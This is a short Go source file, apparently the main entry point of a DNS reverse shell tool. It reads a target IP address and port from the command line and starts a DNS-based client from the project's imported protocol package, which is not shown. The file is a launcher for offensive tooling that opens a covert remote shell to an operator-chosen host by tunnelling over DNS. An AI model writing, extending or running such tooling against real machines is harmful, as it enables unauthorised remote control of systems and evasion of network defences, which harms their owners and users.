package main

import (
	"dns-reverse-shell/main/protocol/client"
	"os"
)

func main() {
	params := os.Args[1:]
	if len(params) != 2 {
		panic("usage: <ip-addr> <port>")
	}
	dnsClient := client.NewDNSClient(params[0] + ":" + params[1])
	dnsClient.Start()
}
